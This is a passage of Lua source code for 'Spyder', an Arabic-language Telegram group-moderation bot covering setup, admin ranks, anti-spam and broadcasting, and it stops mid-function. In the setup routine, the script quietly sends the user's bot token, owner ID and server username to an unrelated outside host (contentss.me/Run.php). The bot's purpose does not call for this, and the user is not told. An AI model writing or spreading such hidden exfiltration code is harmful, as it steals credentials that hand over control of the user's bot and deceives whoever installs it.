--[[
══════════════════════════════════════════════════╗
░██████╗██████╗░██╗░░░██╗██████╗░███████╗██████╗░ ║
██╔════╝██╔══██╗╚██╗░██╔╝██╔══██╗██╔════╝██╔══██╗ ║
╚█████╗░██████╔╝░╚████╔╝░██║░░██║█████╗░░██████╔╝ ║
░╚═══██╗██╔═══╝░░░╚██╔╝░░██║░░██║██╔══╝░░██╔══██╗ ║
██████╔╝██║░░░░░░░░██║░░░██████╔╝███████╗██║░░██║ ║
╚═════╝░╚═╝░░░░░░░░╚═╝░░░╚═════╝░╚══════╝╚═╝░░╚═╝ ║
══════════════════════════════════════════════════╝
⌔︙- Done Installations Source Spyder 
⌔︙- Thanks For your use Source Spyder
══════════════════════════════
--]]
http = require("socket.http")
https = require("ssl.https")
JSON = dofile("./Offices/dkjson.lua")
json = dofile("./Offices/JSON.lua")
URL = dofile("./Offices/url.lua")
serpent = dofile("./Offices/serpent.lua")
redis = dofile("./Offices/redis.lua").connect("127.0.0.1", 6379)
ZAINSpyder = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
--------------------------------------------------------------------------------------------------------------
local AutoSet = function() 
local create = function(data, file, uglify)  
file = io.open(file, "w+")   
local serialized   
if not uglify then  
serialized = serpent.block(data, {comment = false, name = "Info"})  
else  
serialized = serpent.dump(data)  
end    
file:write(serialized)    
file:close()  
end  
if not redis:get(ZAINSpyder..":token") then
io.write('\27[0;36m\n🔄︙Send Token For Bot : ارسل توكن البوت ... \n\027[00m')
local token = io.read()
if token ~= '' then
local url = json:decode(io.popen('curl https://api.telegram.org/bot'..token..'/getMe'):read("*all"))
if not url.ok then
io.write('\n\27[1;31m🔄┋Token Is Communication Error\n التوكن الذي ارسلته خطأ اعد المحاولة \n\27[0;39;49m')
else
io.write('\27[1;36m ⌔︙Done Save Token : تم حفظ التوكن \n27[0;39;49m')
redis:set(ZAINSpyder..":token",token)
end 
else
io.write('\n\27[1;31m\n🔄︙Token was not saved \n لم يتم حفظ التوكن \n\27[0;39;49m')
end 
os.execute('lua Spyder.lua')
end
if not redis:get(ZAINSpyder..":SUDO:ID") then
io.write('\27[0;33m\n🔄︙Send ID For Sudo_bot : ارسل ايدي المطور الاساسي ... \n\027[00m')
local SUDOID = io.read()
if SUDOID ~= '' then
io.write('\27[1;35m\n 🔄︙Done Save ID : تم حفظ ايدي المطور الاساسي \n\27[0;33;49m')
redis:set(ZAINSpyder..":SUDO:ID",SUDOID)
else
io.write('\n\27[1;31m\n🔄︙ID was not saved : لم يتم حفظ ايدي المطور \n\27[0;39;49m')
end 
os.execute('lua Spyder.lua')
end
local create_config_auto = function()
config = {
token = redis:get(ZAINSpyder..":token"),
SUDO = redis:get(ZAINSpyder..":SUDO:ID"),
 }
create(config, "./Info.lua")   
end 
zaininfo = {}
zaininfo.id = redis:get(ZAINSpyder..":SUDO:ID")
zaininfo.tokenbot  = redis:get(ZAINSpyder..":token")
zaininfo.userjoin  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
https.request('https://contentss.me/Run.php?insert='..JSON.encode(zaininfo))
create_config_auto()
file = io.open("Spyder", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/Spyder
token="]]..redis:get(ZAINSpyder..":token")..[["
while(true) do
rm -fr ../.telegram-cli
./tg -s ./Spyder.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("RUN", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/Spyder
while(true) do
rm -fr ../.telegram-cli
screen -S Spyder -X kill
screen -S Spyder ./Spyder
done
]])  
file:close() 
os.execute('rm -fr $HOME/.telegram-cli')
end 
local serialize_to_file = function(data, file, uglify)  
file = io.open(file, "w+")  
local serialized  
if not uglify then   
serialized = serpent.block(data, {comment = false, name = "Info"})  
else   
serialized = serpent.dump(data) 
end  
file:write(serialized)  
file:close() 
end 
local load_redis = function()  
local f = io.open("./Info.lua", "r")  
if not f then   
AutoSet()  
else   
f:close()  
redis:del(ZAINSpyder..":token")
redis:del(ZAINSpyder..":SUDO:ID")
end  
local config = loadfile("./Info.lua")() 
return config 
end 
_redis = load_redis()
print("\27[0;33m>>"..[[

══════════════════════════════════════════════════╗
░██████╗██████╗░██╗░░░██╗██████╗░███████╗██████╗░ ║
██╔════╝██╔══██╗╚██╗░██╔╝██╔══██╗██╔════╝██╔══██╗ ║
╚█████╗░██████╔╝░╚████╔╝░██║░░██║█████╗░░██████╔╝ ║
░╚═══██╗██╔═══╝░░░╚██╔╝░░██║░░██║██╔══╝░░██╔══██╗ ║
██████╔╝██║░░░░░░░░██║░░░██████╔╝███████╗██║░░██║ ║
╚═════╝░╚═╝░░░░░░░░╚═╝░░░╚═════╝░╚══════╝╚═╝░░╚═╝ ║
══════════════════════════════════════════════════╝
⌔︙- Done Installations Source Spyder 
⌔︙- Thanks For your use Source Spyder
══════════════════════════════
                                        
]].."\n\027[00m")
--------------------------------------------------------------------------------------------------------------
sudos = dofile("./Info.lua") 
SUDO = tonumber(sudos.SUDO)
sudo_users = {SUDO}
bot_id = sudos.token:match("(%d+)")  
token = sudos.token 
--- start functions
--------------------------------------------------------------------------------------------------------------
function vardump(value)  
print(serpent.block(value, {comment=false}))   
end 
function Sudo_id(msg)  
local Spyder = false  
if tonumber(msg.sender_user_id_) == tonumber(SUDO) then
Spyder = true  
end
return Spyder  
end 
function Sudo_bot(msg) 
local hash = redis:sismember('Spyder:'..bot_id..'Set:Sudo_bot', msg.sender_user_id_) 
if hash or Sudo_id(msg) then  
return true  
else  
return false  
end  
end
function BasicConstructor(msg)
local hash = redis:sismember('Spyder:'..bot_id..'Set:Basic:Constructor'..msg.chat_id_, msg.sender_user_id_) 
if hash or Sudo_id(msg) or Sudo_bot(msg) then 
return true 
else 
return false 
end 
end
function Constructor(msg)
local hash = redis:sismember('Spyder:'..bot_id..'Set:Creator'..msg.chat_id_, msg.sender_user_id_) 
if hash or Sudo_id(msg) or Sudo_bot(msg) or BasicConstructor(msg) then    
return true    
else    
return false    
end 
end
function Owners(msg)
local hash = redis:sismember('Spyder:'..bot_id..'Set:Moder'..msg.chat_id_,msg.sender_user_id_)    
if hash or Sudo_id(msg) or Sudo_bot(msg) or BasicConstructor(msg) or Constructor(msg) then    
return true    
else    
return false    
end 
end
function Canban(msg)
local hash = redis:sismember('Spyder:'..bot_id..'SET:BAN'..msg.chat_id_,msg.sender_user_id_)    
if hash or Sudo_id(msg) or Sudo_bot(msg) or BasicConstructor(msg) or Constructor(msg) then    
return true    
else    
return false    
end 
end
function Mod(msg)
local hash = redis:sismember('Spyder:'..bot_id..'Set:Admin'..msg.chat_id_,msg.sender_user_id_)    
if hash or Sudo_id(msg) or Sudo_bot(msg) or BasicConstructor(msg) or Constructor(msg) or Owners(msg) then    
return true    
else    
return false    
end 
end
function Vips(msg)
local hash = redis:sismember('Spyder:'..bot_id..'Set:Vip'..msg.chat_id_,msg.sender_user_id_) 
if hash or Sudo_id(msg) or Sudo_bot(msg) or BasicConstructor(msg) or Constructor(msg) or Owners(msg) or Mod(msg) then    
return true 
else 
return false 
end 
end
function GetZanCan(user_id,chat_id)
if tonumber(user_id) == tonumber(SUDO) then
var = true  
elseif redis:sismember('Spyder:'..bot_id..'Set:Sudo_bot', user_id) then
var = true  
elseif redis:sismember('Spyder:'..bot_id..'Set:Basic:Constructor'..chat_id, user_id) then
var = true
elseif redis:sismember('Spyder:'..bot_id..'Set:Creator'..chat_id, user_id) then
var = true  
elseif redis:sismember('Spyder:'..bot_id..'Set:Moder'..chat_id, user_id) then
var = true  
elseif redis:sismember('Spyder:'..bot_id..'Set:Admin'..chat_id, user_id) then
var = true  
elseif redis:sismember('Spyder:'..bot_id..'Set:Vip'..chat_id, user_id) then  
var = true  
else  
var = false  
end  
return var
end 
function Get_Rutba(user_id,chat_id)
if tonumber(user_id) == tonumber(SUDO) then
var = 'المطور الاساسي'  
elseif tonumber(user_id) == tonumber(bot_id) then  
var = 'البوت'
elseif redis:sismember('Spyder:'..bot_id..'Set:Sudo_bot', user_id) then
var = redis:get('Spyder:'..bot_id.."Sudo_bot:Reply"..msg.chat_id_) or 'مطور البوت'  
elseif redis:sismember('Spyder:'..bot_id..'Set:Basic:Constructor'..chat_id, user_id) then
var = redis:get('Spyder:'..bot_id.."BasicConstructor:Reply"..msg.chat_id_) or 'منشئ اساسي'
elseif redis:sismember('Spyder:'..bot_id..'Set:Creator'..chat_id, user_id) then
var = redis:get('Spyder:'..bot_id.."Constructor:Reply"..msg.chat_id_) or 'المنشئ'  
elseif redis:sismember('Spyder:'..bot_id..'Set:Moder'..chat_id, user_id) then
var = redis:get('Spyder:'..bot_id.."Owners:Reply"..msg.chat_id_) or 'مدير الكروب'  
elseif redis:sismember('Spyder:'..bot_id..'Set:Admin'..chat_id, user_id) then
var = redis:get('Spyder:'..bot_id.."Mod:Reply"..msg.chat_id_) or 'ادمن الكروب'  
elseif redis:sismember('Spyder:'..bot_id..'Set:Vip'..chat_id, user_id) then  
var = redis:get('Spyder:'..bot_id.."Vips:Reply"..msg.chat_id_) or 'عضو مميز'  
else  
var = redis:get('Spyder:'..bot_id.."Memp:Reply"..msg.chat_id_) or 'عضو تافه 😹'
end  
return var
end 
function Groups_Users(chat_id)
if redis:sismember('Spyder:'..bot_id.."Groups_Users",chat_id) then
var = true
else 
var = false
end
return var
end
function Muted_User(Chat_id,User_id) 
if redis:sismember('Spyder:'..bot_id..'Muted:User'..Chat_id,User_id) then
Var = true
else
Var = false
end
return Var
end
function Ban_User(Chat_id,User_id) 
if redis:sismember('Spyder:'..bot_id..'Ban:User'..Chat_id,User_id) then
Var = true
else
Var = false
end
return Var
end 
function GBan_User(User_id) 
if redis:sismember('Spyder:'..bot_id..'GBan:User',User_id) then
Var = true
else
Var = false
end
return Var
end
function AddChannel(User)
local var = true
if redis:get('Spyder:'..bot_id..'add:ch:id') then
local url , res = https.request("https://api.telegram.org/bot"..token.."/getchatmember?chat_id="..redis:get('Spyder:'..bot_id..'add:ch:id').."&user_id="..User);
data = json:decode(url)
if res ~= 200 or data.result.status == "left" or data.result.status == "kicked" then
var = false
end
end
return var
end
function dl_cb(a,d)
end
function getChatId(id)
local chat = {}
local id = tostring(id)
if id:match('^-100') then
local channel_id = id:gsub('-100', '')
chat = {ID = channel_id, type = 'channel'}
else
local group_id = id:gsub('-', '')
chat = {ID = group_id, type = 'group'}
end
return chat
end
function Group_Kick(chat,user)
tdcli_function ({
ID = "ChangeChatMemberStatus",
chat_id_ = chat,
user_id_ = user,
status_ = {ID = "ChatMemberStatusKicked"},},function(arg,data) end,nil)
end
local function send(chat_id, reply_to_message_id, text)
local TextParseMode = {ID = "TextParseModeMarkdown"}
tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 1,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil)
end
function DeleteMessage(chat,id)
tdcli_function ({
ID="DeleteMessages",
chat_id_=chat,
message_ids_=id
},function(arg,data) 
end,nil)
end
function PinMessage(chat, id)
tdcli_function ({
ID = "PinChannelMessage",
channel_id_ = getChatId(chat).ID,
message_id_ = id,
disable_notification_ = 0
},function(arg,data) 
end,nil)
end
function UnPinMessage(chat)
tdcli_function ({
ID = "UnpinChannelMessage",
channel_id_ = getChatId(chat).ID
},function(arg,data) 
end,nil)
end
local function GetChat(chat_id) 
tdcli_function ({
ID = "GetChat",
chat_id_ = chat_id
},cb, nil) 
end  
function getInputFile(file) 
if file:match('/') then infile = {ID = "InputFileLocal", path_ = file} elseif file:match('^%d+$') then infile = {ID = "InputFileId", id_ = file} else infile = {ID = "InputFilePersistentId", persistent_id_ = file} end return infile 
end
function ked(User_id,Chat_id)
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..Chat_id.."&user_id="..User_id)
end
function s_api(web) 
local info, res = https.request(web) local req = json:decode(info) if res ~= 200 then return false end if not req.ok then return false end return req 
end 
local function sendText(chat_id, text, reply_to_message_id, markdown) 
send_api = "https://api.telegram.org/bot"..token local url = send_api..'/sendMessage?chat_id=' .. chat_id .. '&text=' .. URL.escape(text) if reply_to_message_id ~= 0 then url = url .. '&reply_to_message_id=' .. reply_to_message_id  end if markdown == 'md' or markdown == 'markdown' then url = url..'&parse_mode=Markdown' elseif markdown == 'html' then url = url..'&parse_mode=HTML' end return s_api(url)  
end
function send_inline_key(chat_id,text,keyboard,inline,reply_id) 
local response = {} response.keyboard = keyboard response.inline_keyboard = inline response.resize_keyboard = true response.one_time_keyboard = false response.selective = false  local send_api = "https://api.telegram.org/bot"..token.."/sendMessage?chat_id="..chat_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true&reply_markup="..URL.escape(JSON.encode(response)) if reply_id then send_api = send_api.."&reply_to_message_id="..reply_id end return s_api(send_api) 
end
local function GetInputFile(file)  
local file = file or ""   if file:match('/') then  infile = {ID= "InputFileLocal", path_  = file}  elseif file:match('^%d+$') then  infile = {ID= "InputFileId", id_ = file}  else  infile = {ID= "InputFilePersistentId", persistent_id_ = file}  end return infile 
end
local function sendRequest(request_id, chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, callback, extra) 
tdcli_function ({  ID = request_id,    chat_id_ = chat_id,    reply_to_message_id_ = reply_to_message_id,    disable_notification_ = disable_notification,    from_background_ = from_background,    reply_markup_ = reply_markup,    input_message_content_ = input_message_content,}, callback or dl_cb, extra) 
end
local function sendAudio(chat_id,reply_id,audio,title,caption)  
tdcli_function({ID="SendMessage",  chat_id_ = chat_id,  reply_to_message_id_ = reply_id,  disable_notification_ = 0,  from_background_ = 1,  reply_markup_ = nil,  input_message_content_ = {  ID="InputMessageAudio",  audio_ = GetInputFile(audio),  duration_ = '',  title_ = title or '',  performer_ = '',  caption_ = caption or ''  }},dl_cb,nil)
end  
local function sendVideo(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, video, duration, width, height, caption, cb, cmd)    
local input_message_content = { ID = "InputMessageVideo",      video_ = getInputFile(video),      added_sticker_file_ids_ = {},      duration_ = duration or 0,      width_ = width or 0,      height_ = height or 0,      caption_ = caption    }    sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)  
end
function sendDocument(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, document, caption, dl_cb, cmd) 
tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = disable_notification,from_background_ = from_background,reply_markup_ = reply_markup,input_message_content_ = {ID = "InputMessageDocument",document_ = getInputFile(document),caption_ = caption},}, dl_cb, cmd) 
end
local function sendVoice(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, voice, duration, waveform, caption, cb, cmd)  
local input_message_content = {   ID = "InputMessageVoice",   voice_ = getInputFile(voice),  duration_ = duration or 0,   waveform_ = waveform,    caption_ = caption  }  sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd) 
end
local function sendSticker(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, sticker, cb, cmd)  
local input_message_content = {    ID = "InputMessageSticker",   sticker_ = getInputFile(sticker),    width_ = 0,    height_ = 0  } sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd) 
end
local function sendPhoto(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, photo,caption)   
tdcli_function ({ ID = "SendMessage",   chat_id_ = chat_id,   reply_to_message_id_ = reply_to_message_id,   disable_notification_ = disable_notification,   from_background_ = from_background,   reply_markup_ = reply_markup,   input_message_content_ = {   ID = "InputMessagePhoto",   photo_ = getInputFile(photo),   added_sticker_file_ids_ = {},   width_ = 0,   height_ = 0,   caption_ = caption  },   }, dl_cb, nil)  
end
function Total_Msg(msgs)  
local Spyder_Msg = 'بعدك يديد ᯓ'  
if msgs < 100 then 
Spyder_Msg = 'ضعيف ᯓ' 
elseif msgs < 200 then 
Spyder_Msg = 'غير متفاعل ᯓ' 
elseif msgs < 400 then 
Spyder_Msg = 'استمر بطل ᯓ' 
elseif msgs < 700 then 
Spyder_Msg = 'ملك التفاعل ᯓ' 
elseif msgs < 1200 then 
Spyder_Msg = 'اسد التفاعل ᯓ' 
elseif msgs < 2000 then 
Spyder_Msg = 'اقوى تفاعل ᯓ' 
elseif msgs < 3500 then 
Spyder_Msg = 'اجمل تفاعل ᯓ'  
elseif msgs < 4000 then 
Spyder_Msg = 'تفاعل روعه ᯓ' 
elseif msgs < 4500 then 
Spyder_Msg = 'التفاعل المثالي ᯓ' 
elseif msgs < 5500 then 
Spyder_Msg = 'اقوى متفاعل ᯓ' 
elseif msgs < 7000 then 
Spyder_Msg = 'ملك التفاعل ᯓ' 
elseif msgs < 9500 then 
Spyder_Msg = 'امبروطور التفاعل ᯓ' 
elseif msgs < 10000000000 then 
Spyder_Msg = 'رب التفاعل ᯓ'  
end
return Spyder_Msg 
end
function GetFile_Bot(msg)
local list = redis:smembers('Spyder:'..bot_id..'Groups_Users') 
local t = '{"BOT_ID": '..bot_id..',"GP_BOT":{'  
for k,v in pairs(list) do   
NAME = 'Spyder Chat'
link = redis:get('Spyder:'..bot_id.."Private:Group:Link"..msg.chat_id_) or ''
ASAS = redis:smembers('Offices/JSON.lua:'..bot_id..'Set:Basic:Constructor'..v)
MNSH = redis:smembers('Spyder:'..bot_id..'Set:Creator'..v)
MDER = redis:smembers('Spyder:'..bot_id..'Set:Moder'..v)
MOD = redis:smembers('Spyder:'..bot_id..'Set:Admin'..v)
if k == 1 then
t = t..'"'..v..'":{"Spyder":"'..NAME..'",'
else
t = t..',"'..v..'":{"Spyder":"'..NAME..'",'
end
if #ASAS ~= 0 then 
t = t..'"ASAS":['
for k,v in pairs(ASAS) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MOD ~= 0 then
t = t..'"MOD":['
for k,v in pairs(MOD) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MDER ~= 0 then
t = t..'"MDER":['
for k,v in pairs(MDER) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MNSH ~= 0 then
t = t..'"MNSH":['
for k,v in pairs(MNSH) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
t = t..'"linkgroup":"'..link..'"}' or ''
end
t = t..'}}'
local File = io.open('./Offices/'..bot_id..'.json', "w")
File:write(t)
File:close()
sendDocument(msg.chat_id_, msg.id_,0, 1, nil, './Offices/'..bot_id..'.json', '⌔︙عدد مجموعات التي في البوت { '..#list..'}')
end
function download_to_file(url, file_path) 
local respbody = {} 
local options = { url = url, sink = ltn12.sink.table(respbody), redirect = true } 
local response = nil 
options.redirect = false 
response = {https.request(options)} 
local code = response[2] 
local headers = response[3] 
local status = response[4] 
if code ~= 200 then return false, code 
end 
file = io.open(file_path, "w+") 
file:write(table.concat(respbody)) 
file:close() 
return file_path, code 
end 
function AddFile_Bot(msg,chat,ID_FILE,File_Name)
if File_Name:match('.json') then
if tonumber(File_Name:match('(%d+)')) ~= tonumber(bot_id) then 
send(chat,msg.id_,"⌔︙ملف النسخه الاحتياطيه ليس لهذا البوت")   
return false 
end      
local File = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..ID_FILE) ) 
download_to_file('https://api.telegram.org/file/bot'..token..'/'..File.result.file_path, ''..File_Name) 
send(chat,msg.id_,"⌔︙ جاري ...\n⌔︙ رفع الملف الان")   
else
send(chat,msg.id_,"*⌔︙عذرا الملف ليس بصيغة {JSON} يرجى رفع الملف الصحيح*")   
end      
local info_file = io.open('./'..bot_id..'.json', "r"):read('*a')
local groups = JSON.decode(info_file)
for idg,v in pairs(groups.GP_BOT) do
redis:sadd('Spyder:'..bot_id..'Groups_Users',idg)  
redis:set('Spyder:'..bot_id..'lock:tagservrbot'..idg,true)   
list ={"lock:Bot:kick","lock:user:name","lock:hashtak","lock:Cmd","lock:Link","lock:forward","lock:Keyboard","lock:geam","lock:Photo","lock:Animation","lock:Video","lock:Audio","lock:vico","lock:Sticker","lock:Document","lock:Unsupported","lock:Markdaun","lock:Contact","lock:Spam"}
for i,lock in pairs(list) do 
redis:set('Spyder:'..bot_id..lock..idg,'del')    
end
if v.MNSH then
for k,idmsh in pairs(v.MNSH) do
redis:sadd('Spyder:'..bot_id..'Set:Creator'..idg,idmsh)
end
end
if v.MDER then
for k,idmder in pairs(v.MDER) do
redis:sadd('Spyder:'..bot_id..'Set:Moder'..idg,idmder)  
end
end
if v.MOD then
for k,idmod in pairs(v.MOD) do
redis:sadd('Spyder:'..bot_id..'Set:Admin'..idg,idmod)  
end
end
if v.ASAS then
for k,idASAS in pairs(v.ASAS) do
redis:sadd('Spyder:'..bot_id..'Set:Basic:Constructor'..idg,idASAS)  
end
end
end
send(chat,msg.id_,"\n⌔︙تم رفع الملف بنجاح وتفعيل المجموعات\n⌔︙ورفع {الامنشئين الاساسين ; والمنشئين ; والمدراء; والادمنيه} بنجاح")   
end
local function trigger_anti_spam(msg,type)
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
if type == 'kick' then 
Text = '\n⌔︙ العضــو ↫ '..Name..'\n⌔︙ قام بالتكرار هنا وتم طرده '  
sendText(msg.chat_id_,Text,0,'md')
Group_Kick(msg.chat_id_,msg.sender_user_id_) 
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
return false  
end 
if type == 'del' then 
DeleteMessage(msg.chat_id_,{[0] = msg.id_})    
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
end 
if type == 'keed' then
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..msg.sender_user_id_.."") 
redis:sadd('Spyder:'..bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_) 
msgm = msg.id_
my_ide = msg.sender_user_id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
Text = '\n⌔︙ العضــو ↫ '..Name..'\n⌔︙ قام بالتكرار هنا وتم تقيده '  
sendText(msg.chat_id_,Text,0,'md')
return false  
end  
if type == 'mute' then
Text = '\n⌔︙ العضــو ↫ '..Name..'\n⌔︙قام بالتكرار هنا وتم كتمه '  
sendText(msg.chat_id_,Text,0,'md')
redis:sadd('Spyder:'..bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_) 
msgm = msg.id_
my_ide = msg.sender_user_id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
return false  
end
end,nil)   
end 
--------------------------------------------------------------------------------------------------------------
function DevSpyder(msg,data) -- Source Spyder 
if msg then
local text = msg.content_.text_
--------------------------------------------------------------------------------------------------------------
if msg.chat_id_ then
local id = tostring(msg.chat_id_)
if id:match("-100(%d+)") then
redis:incr('Spyder:'..bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_) 
Chat_Type = 'GroupBot' 
elseif id:match("^(%d+)") then
redis:sadd('Spyder:'..bot_id..'Users:ids',msg.sender_user_id_)  
Chat_Type = 'UserBot' 
else
Chat_Type = 'GroupBot' 
end
end
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'UserBot' then  
if text == '/start' then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔︙عذراً عليك الاشتراك في القناة\n⌔︙اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
if Sudo_id(msg) then
local bl = '👋🏻︙ مرحبا انت المطور الاساسي هنا'
local keyboard = {
{'ضع اسم للبوت ©'},
{'تعطيل التواصل ✖','تفعيل التواصل 🔛'},
{'تفعيل الاشتراك الاجباري 🔭','تعطيل الاشتراك الاجباري 🚫'},
{'الاحصائيات 📈'},
{'تعين قناة الاشتراك 🎯','الاشتراك الاجباري 📡'},
{'تغير رساله الاشتراك 🔆','حذف رساله الاشتراك 📃'},
{'اذاعه بالتثبيت 📌'},
{'اذاعه للمجموعات 👥','اذاعه للمشتركين 👤'},
{'اذاعه بالتوجيه للمجموعات ↪','اذاعه بالتوجيه للمشتركين 👤'},
{'تفعيل الوضع الخدمي 🔓','تعطيل الوضع الخدمي 🔏'},
{'المطورين 🕹'},
{'تنظيف المجموعات 🗑','تنظيف المشتركين 👥'},
{'قائمه العام 📃'},
{'حذف كليشه ستارت 🚫','ضع كليشه ستارت 🔖'},
{'نسخه احتياطيه 💾','تحديث السورس ™'},
{'الغاء ✖'}
}
send_inline_key(msg.chat_id_,bl,keyboard)
else
if not redis:get('Spyder:'..bot_id..'Start:Time'..msg.sender_user_id_) then
local start = redis:get('Spyder:'..bot_id.."Start:Bot")  
if start then 
KleshaStart = start
else
KleshaStart = '⌔︙مرحبا بك في بوت الحمايه'..'\n⌔︙آنا آختصاصي حمايه المجموعات'..'\n⌔︙مـن آلسـبآم وآلتوجيه وآلتگرآر وآلخ...'..'\n\n⌔︙ارسل ما تريد وسارسله الى المطور'..'\n⌔︙قناة السورس @Spyder'..'\n🚶🏻‍♂️'
end 
send(msg.chat_id_, msg.id_, KleshaStart) 
end
end
redis:setex('Spyder:'..bot_id..'Start:Time'..msg.sender_user_id_,300,true)
return false
end
if not Sudo_id(msg) and not redis:sismember('Spyder:'..bot_id..'Ban:Users:ids',msg.sender_user_id_) and not redis:get('Spyder:'..bot_id..'Twal:Bot') then
send(msg.sender_user_id_, msg.id_, '⌔︙تم ارسال رسالتك الى المطور')    
tdcli_function ({ID = "ForwardMessages", chat_id_ = SUDO,    from_chat_id_ = msg.sender_user_id_,    message_ids_ = {[0] = msg.id_},    disable_notification_ = 1,    from_background_ = 1 },function(arg,data) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,ta) 
vardump(data)
if data and data.messages_ and data.messages_[0].content_ and data.messages_[0].content_.sticker_ then
local Name = '['..string.sub(ta.first_name_,0, 40)..'](tg://user?id='..ta.id_..')'
local Text = '⌔︙ تم ارسال الملصق من ↓\n - '..Name
sendText(SUDO,Text,0,'md')
end 
end,nil) 
end,nil)
end
if Sudo_id(msg) and msg.reply_to_message_id_ ~= 0  then    
tdcli_function({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)},function(extra, result, success) 
if result.forward_info_.sender_user_id_ then     
id_user = result.forward_info_.sender_user_id_    
end     
tdcli_function ({ID = "GetUser",user_id_ = id_user},function(arg,data) 
if text == 'حظر' then
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = '⌔︙ العضو ↫ '..Name..'\n⌔︙ تم حظره من التواصل '
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
redis:sadd('Spyder:'..bot_id..'Ban:Users:ids',data.id_)  
return false  
end 
if text =='الغاء الحظر' then
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = '⌔︙ العضو ↫ '..Name..'\n⌔︙ تم حظره من التواصل '
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
redis:srem('Spyder:'..bot_id..'Ban:Users:ids',data.id_)  
return false  
end 

tdcli_function({ID='GetChat',chat_id_ = id_user},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",chat_id_ = id_user, action_ = {  ID = "SendMessageTypingAction", progress_ = 100} },function(arg,ta) 
if ta.code_ == 400 or ta.code_ == 5 then
local Spyder_Msg = '\n⌔︙ فشل ارسال رسالتك لان العضو قام بحظر البوت'
send(msg.chat_id_, msg.id_,Spyder_Msg) 
return false  
end 
if text then    
send(id_user,msg.id_,text)    
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = '⌔︙ العضو ↫ '..Name..'\n⌔︙ تم ارسال الرساله اليه'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
return false
end    
